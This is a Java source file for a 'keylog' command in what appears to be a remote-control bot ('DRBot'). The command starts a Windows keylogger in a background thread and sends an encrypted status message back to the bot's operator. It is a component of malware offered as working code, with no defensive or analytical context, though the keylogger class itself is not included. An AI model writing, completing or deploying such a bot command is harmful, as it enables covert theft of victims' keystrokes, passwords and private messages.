package com.DRBot.Commands;

import com.DRBot.Commands.keyLogger.keyLog.WindowsKeyLogger;
import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.IOException;

/**
 *
 * @author MerNat
 */
public class keylog{
    private PrintWriter writer;
    private Thread start;
    private final SecureLine secureLine;
    
    keylog(String[] command,PrintWriter writer,SecureLine secureLine){
        this.writer = writer;
        this.secureLine = secureLine;
        start = new Thread(new Runnable(){
            @Override
            public void run(){
                new WindowsKeyLogger().start();
            }
        });
        if(!checkThread()){
            start.start();
                toPrint("[KeyLogger] Started.");
        }
    }
    private boolean checkThread(){
        return start.isAlive();
    }
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
